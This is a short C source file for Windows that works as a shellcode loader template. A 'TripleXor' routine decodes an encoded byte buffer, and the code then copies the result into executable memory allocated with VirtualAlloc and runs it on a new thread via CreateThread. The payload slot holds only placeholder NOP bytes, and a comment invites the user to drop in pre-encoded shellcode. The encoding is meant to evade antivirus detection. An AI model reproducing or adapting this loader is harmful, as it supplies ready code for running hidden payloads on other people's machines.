#include <windows.h>
#include <stdio.h>

void TripleXor(unsigned char* buf, int size) {
	const unsigned char encoderChar = '\x42';
	for (int i = 0; i < size; i++) {
		for (int j = 0; j < 3; j++)
		{
			buf[i] = buf[i] ^ (encoderChar + j);
		}

	}
}

int main() {
	// Change me! Pre-encoded shellcode 
	unsigned char shellcode[] = "\x90\x90\x90\x90\x90\x90\x90\x90";

	LPVOID basePageAddress;

	TripleXor(shellcode, sizeof(shellcode)-1);

	// Allocate memory
	basePageAddress = VirtualAlloc( NULL, (SIZE_T)sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

	if (basePageAddress == NULL) {
		printf("[x] Could not allocate memory. Error: %d", GetLastError());
		return 1;
	}

	// Write memory
	memcpy( basePageAddress, &shellcode, (size_t)sizeof(shellcode) );

	// Create thread that points to shellcode
	CreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)basePageAddress, NULL, 0, NULL ); 

	//Wait for the new thread to spawn
	Sleep(1000);
	
	return 0;
}
